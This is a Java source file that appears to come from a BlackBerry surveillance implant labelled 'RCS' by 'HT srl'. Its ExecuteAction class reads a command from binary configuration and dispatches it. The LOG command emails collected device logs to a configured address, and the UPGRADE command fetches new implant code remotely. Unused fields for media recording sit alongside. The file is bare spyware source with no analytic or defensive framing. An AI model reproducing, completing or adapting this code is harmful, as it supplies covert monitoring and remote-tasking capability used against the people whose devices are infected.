//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ExecuteAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.util.Vector;

import javax.microedition.media.Player;
import javax.microedition.media.control.RecordControl;

import net.rim.device.api.util.DataBuffer;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.upgrade.Upgrade;
import blackberry.utils.Check;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class ExecuteAction.
 */
public final class ExecuteAction extends SubAction {
    //#ifdef DEBUG
    static Debug debug = new Debug("ExecuteAction", DebugLevel.VERBOSE);
    //#endif

    private String command;

    /**
     * Instantiates a new execute action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public ExecuteAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {

        String eventName = "NULL";
        if (triggeringEvent != null) {
            eventName = triggeringEvent.toString();
        }

        //#ifdef DEBUG_INFO
        debug.info("Execute: " + command);
        debug.info("Event: " + eventName);
        //#endif

        if (command == null) {
            return false;
        }

        final Vector params = new Vector();
        final String cmd = getParams(command, params);

        if (cmd.equals("DEBUG")) {
            executeDebug(params);
        } else if (cmd.equals("LOG")) {
            executeLog(params);
        } else if (cmd.equals("UPGRADE")) {
            executeUpgrade(params);
        }

        return true;
    }

    void executeLog(final Vector params) {

        if (params.size() > 0) {
            final String email = (String) params.elementAt(0);
            //#ifdef SEND_LOG
            debug.info("Send Log to: " + email);
            final boolean ret = Debug.sendLogs(email);
            debug.trace("Sending result: " + ret);
            //#endif
        } else {
            //#ifdef DEBUG
            debug.info("Empty params ");
            //#endif
        }
    }

    void executeDebug(final Vector params) {
        //#ifdef DEBUG_INFO        
        for (int i = 0; i < params.size(); i++) {
            debug.info("executeDebug: " + params.elementAt(i));
        }
        //#endif
    }

    void executeUpgrade(final Vector params) {
        //#ifdef DEBUG_INFO        
        debug.info("executeUpgrade");
        for (int i = 0; i < params.size(); i++) {
            debug.info(" arg: " + params.elementAt(i));
        }
        //#endif

        Upgrade upgrade = new Upgrade();
        try {
            upgrade.fetch();
        } catch (Exception e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif;
        }

    }

    private Player _player;
    private RecordControl _rcontrol;
    private ByteArrayOutputStream _output;
    private byte _data[];



    private static String getParams(final String fullCommand,
            final Vector params) {

        //#ifdef DBC
        Check.requires(fullCommand != null, "getParams cmd !=null");
        Check.requires(params != null, "getParams params !=null");
        Check.requires(params.size() == 0, "getParams params.size() == 0");
        //#endif

        final Vector vector = Utils.Tokenize(fullCommand, " ");

        //#ifdef DBC
        Check.asserts(vector != null, "getParams array !=null");
        Check.asserts(vector.size() > 0, "getParams array.length > 0");
        //#endif

        final String command = (String) vector.elementAt(0);

        for (int i = 1; i < vector.size(); i++) {
            params.addElement(vector.elementAt(i));
        }

        return command;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        if (confParams == null) {
            command = "DEBUG";
        } else {
            // estrarre la stringa.
            final DataBuffer databuffer = new DataBuffer(confParams, 0,
                    confParams.length, false);
            try {
                final int len = databuffer.readInt();
                final byte[] buffer = new byte[len];
                databuffer.read(buffer);
                command = WChar.getString(buffer, true);

            } catch (final EOFException e) {
                return false;
            }
        }

        //#ifdef DEBUG_INFO
        debug.info("command: " + command);
        //#endif
        return true;
    }

    public String toString() {
        return "Execute " + command;
    }
}
